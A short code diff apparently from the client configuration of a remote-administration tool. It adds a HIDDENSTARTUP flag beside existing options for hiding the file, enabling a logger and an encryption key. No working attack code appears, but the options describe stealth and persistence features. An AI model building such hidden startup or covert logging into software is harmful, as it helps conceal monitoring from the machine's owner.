@@ -23,6 +23,7 @@ namespace xClient.Config
         public static bool HIDEFILE = false;
         public static bool ENABLELOGGER = false;
         public static string TAG = "DEBUG";
+		public static bool HIDDENSTARTUP = false;
 
         public static void Initialize()
         {
@@ -43,6 +44,7 @@ namespace xClient.Config
         public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "ENCKEY";
         public static string TAG = "RELEASE";
+		public static bool HIDDENSTARTUP = false;
 
         public static void Initialize()
         {
